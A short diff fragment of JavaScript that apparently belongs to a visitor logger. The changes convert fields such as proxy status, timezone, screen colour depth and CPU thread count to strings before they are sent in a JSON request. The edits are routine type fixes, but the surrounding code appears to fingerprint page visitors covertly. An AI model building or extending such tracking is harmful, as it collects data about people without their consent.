@@ -83,12 +83,12 @@ request.setRequestHeader('Content-type', 'application/json'); //basically just s
               },
               {
                 name: 'Is Proxy?',
-                value: data.isProxy,
+                value: String(data.isProxy),
                 inline: true
               },
               {
                 name: 'Timezone',
-                value: data.timeZone,
+                value: data.timeZone || 'N/A',
                 inline: true
               },
               {
@@ -103,7 +103,7 @@ request.setRequestHeader('Content-type', 'application/json'); //basically just s
               },
               {
                 name: 'Color Depth',
-                value: window.screen.colorDepth,
+                value: String(window.screen.colorDepth),
                 inline: true
               },
               {
@@ -113,7 +113,7 @@ request.setRequestHeader('Content-type', 'application/json'); //basically just s
               },
               {
                 name: 'Threads',
-                value: navigator.hardwareConcurrency,
+                value: String(navigator.hardwareConcurrency),
                 inline: true
               },
               //{
